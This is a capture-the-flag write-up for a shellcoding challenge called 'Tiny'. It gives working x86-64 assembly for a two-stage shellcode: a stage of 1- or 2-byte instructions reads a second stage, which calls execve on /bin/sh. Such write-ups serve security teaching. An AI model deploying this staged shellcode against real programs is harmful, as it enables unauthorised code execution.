# Tiny

**Category:** Shellcoding

## Overview

The challenge prints: `Can you pop a shell with a shellcode made of 1 or 2 bytes instructions?`

## Analysis

We can only use instructions of max 2 bytes, so we can mainly do pop and push of registers or values.
The solution is to use the first limited shellcode to read a second shellcode without constraints.

The second shellcode is then used to pop the shell without constraints on the instruction's length.



## Vulnerability
Classic shellcode vulnerability, the input of the user gets executed.


## Exploitation
The first shellcode only uses instructions of maximum length: 2 bytes:
```text
push rdx    
pop rsi     first two lines to move the buffer to rsi
push 0x50
pop rdx     size of the read in rdx
push 0x00
pop rdi     i want to read from stdin
syscall
```

Now we do not have constraints for the second shellcode thanks to the first read:

```text
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop     the nop sled is used to overwrite the instructions of the first shellcode -> one nop for every byte of the previous shellcode
mov rdi, 0x0068732f6e69622f     /bin/sh\0
push rdi
mov rdi, rsp
xor rax, rax
xor rsi, rsi
xor rdx, rdx
mov al, 0x3b
syscall     execve syscall
```
The second shellcode simply calls an execve on /bin/sh\0